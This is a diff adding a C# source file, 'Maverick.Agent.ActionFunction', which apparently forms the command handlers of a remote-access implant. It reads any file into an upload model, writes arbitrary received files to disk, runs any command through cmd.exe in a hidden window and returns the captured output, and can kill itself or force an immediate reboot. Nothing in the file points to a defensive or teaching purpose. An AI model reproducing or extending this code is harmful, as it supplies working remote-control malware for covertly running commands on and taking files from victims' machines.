@@ -1,0 +1,81 @@
+﻿using System;
+using System.Text;
+using System.IO;
+
+namespace Maverick.Agent
+{
+    public static class ActionFunction
+    {
+        public static FileUploadModel PerformReadFile(string name)
+        {
+            try
+            {
+                if (!File.Exists(name))
+                {
+                    return null;
+                }
+                var data = File.ReadAllBytes(name);
+                var model = new FileUploadModel
+                {
+                    FileName = Path.GetFileName(name),
+                    FileData = data
+                };
+                return model;
+            }
+            catch (Exception)
+            {
+                return null;
+            }
+        }
+
+
+        public static bool PerformWriteFile(string name, FileUploadModel file)
+        {
+            try
+            {
+                if (file == null || file.FileData == null) return false;
+                string filename = string.IsNullOrEmpty(name) ? file.FileName : name;
+                File.WriteAllBytes(filename, file.FileData);
+                return true;
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+        }
+
+        public static byte[] PerformDoCommand(string command)
+        {
+            try
+            {
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.Arguments = "/c " + command;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.CreateNoWindow = true;
+                process.Start();
+                string output = process.StandardOutput.ReadToEnd();
+                if (string.IsNullOrEmpty(output))
+                    output = process.StandardError.ReadToEnd();
+                process.WaitForExit();
+                return Encoding.UTF8.GetBytes(output);
+            }
+            catch (Exception)
+            {
+                return null;
+            }
+        }
+
+        public static void PerformKillSystem()
+        {
+            Environment.Exit(0);
+        }
+
+        public static void PerformRebotSystem()
+        {
+            System.Diagnostics.Process.Start("shutdown", "/r /f /t 0");
+        }
+    }
+}
